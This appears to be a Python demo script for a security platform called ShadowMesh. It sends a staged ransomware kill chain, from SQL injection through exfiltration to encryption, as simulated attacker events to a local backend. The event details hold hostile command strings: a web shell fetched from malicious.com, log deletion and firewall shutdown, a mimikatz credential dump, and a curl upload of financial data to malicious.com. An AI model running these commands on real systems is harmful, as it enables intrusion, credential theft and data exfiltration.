import time
import requests
import argparse

def print_step(msg):
    print(f"\n[*] {msg}")

def sleep_msg(seconds, msg):
    print(f"    ... {msg}")

def main():
    parser = argparse.ArgumentParser(description="Simulate a Ransomware/Data Exfiltration Campaign.")
    parser.add_argument("--target-ip", default="82.14.99.102", help="Attacker IP to spoof (Simulating an external APT)")
    parser.add_argument("--backend-url", default="http://localhost:8000", help="ShadowMesh Backend URL")
    args = parser.parse_args()

    BASE_URL = args.backend_url
    ATTACKER_IP = args.target_ip

    print("="*60)
    print("[ ShadowMesh Demo — Simulated Ransomware APT ]")
    print("="*60)

    # Fetch topology to get a valid node ID
    try:
        r = requests.get(f"{BASE_URL}/api/topology/current")
        topo = r.json()
        if topo.get("nodes"):
            node_id = topo["nodes"][-1]["node_id"]  # pick the last node
        else:
            node_id = "node_web_01"
    except Exception:
        node_id = "node_web_01"

    print_step("Phase 1 — Initial Access (Web Exploit)")
    print(f"    Exploiting vulnerability on {node_id}...")
    requests.post(f"{BASE_URL}/api/attacker/action", json={
        "attacker_ip": ATTACKER_IP,
        "action_type": "web_exploit",
        "target_node_id": node_id,
        "detail": "SQL Injection on /login.php leading to authentication bypass",
        "timestamp": time.time()
    })
    sleep_msg(2, "Bypassing authentication...")

    print_step("Phase 2 — Execution & Persistence")
    requests.post(f"{BASE_URL}/api/attacker/action", json={
        "attacker_ip": ATTACKER_IP,
        "action_type": "command_exec",
        "target_node_id": node_id,
        "detail": "exec: wget http://malicious.com/shell.php -O /var/www/html/shell.php",
        "timestamp": time.time()
    })
    requests.post(f"{BASE_URL}/api/attacker/action", json={
        "attacker_ip": ATTACKER_IP,
        "action_type": "persistence",
        "target_node_id": node_id,
        "detail": "Added cronjob to execute reverse shell every 5 minutes",
        "timestamp": time.time()
    })
    sleep_msg(3, "Establishing reverse shell connection...")

    print_step("Phase 3 — Defense Evasion & Credential Access")
    requests.post(f"{BASE_URL}/api/attacker/action", json={
        "attacker_ip": ATTACKER_IP,
        "action_type": "defense_evasion",
        "target_node_id": node_id,
        "detail": "exec: rm -rf /var/log/auth.log && systemctl stop iptables",
        "timestamp": time.time()
    })
    requests.post(f"{BASE_URL}/api/attacker/action", json={
        "attacker_ip": ATTACKER_IP,
        "action_type": "credential_theft",
        "target_node_id": node_id,
        "detail": "Dumped LSASS memory using mimikatz / sekurlsa::logonpasswords",
        "timestamp": time.time()
    })
    sleep_msg(3, "Harvesting credentials...")

    print_step("Phase 4 — Collection & Exfiltration")
    requests.post(f"{BASE_URL}/api/attacker/action", json={
        "attacker_ip": ATTACKER_IP,
        "action_type": "collection",
        "target_node_id": node_id,
        "detail": "exec: tar -czvf /tmp/financial_data.tar.gz /mnt/finance_share/",
        "timestamp": time.time()
    })
    requests.post(f"{BASE_URL}/api/attacker/action", json={
        "attacker_ip": ATTACKER_IP,
        "action_type": "exfiltration",
        "target_node_id": node_id,
        "detail": "exec: curl -X POST -F 'file=@/tmp/financial_data.tar.gz' http://malicious.com/upload",
        "timestamp": time.time()
    })
    sleep_msg(2, "Exfiltrating 5GB of sensitive data...")

    print_step("Phase 5 — Impact (Ransomware Deployment)")
    requests.post(f"{BASE_URL}/api/attacker/action", json={
        "attacker_ip": ATTACKER_IP,
        "action_type": "impact",
        "target_node_id": node_id,
        "detail": "exec: ./encryptor.elf --key XYZ --target / --note RANSOM.txt",
        "timestamp": time.time()
    })

    print("\n[OK] Ransomware Simulation complete!")

if __name__ == "__main__":
    main()
